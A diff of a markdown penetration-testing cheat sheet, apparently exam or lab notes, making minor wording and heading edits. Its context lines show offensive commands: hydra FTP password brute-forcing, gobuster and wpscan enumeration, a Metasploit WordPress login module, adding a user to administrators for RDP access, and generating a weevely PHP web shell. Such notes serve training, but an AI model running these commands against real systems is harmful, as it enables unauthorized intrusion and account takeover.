@@ -80,7 +80,7 @@ hydra -l user -P passlist.txt ftp://10.10.10.10
 ```
 #  Hacking Web Application
 ```
-1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
+1- Scan Using OWASP ZAP .In target tab put the url and click automated scan.
 2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
 3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://<target ip>:<target port>//NEW --enumerate u  (u means username) 
 Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
@@ -100,7 +100,7 @@ Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wor
 		       | net user Test      (Once again check to see if it has become administrator)
 Now you can do a RDP connection with the given ip and the Test account which you created.
 ```
-#File Upload
+# File Upload
 ```
 low
 weevely generate <pwd> weevely.php
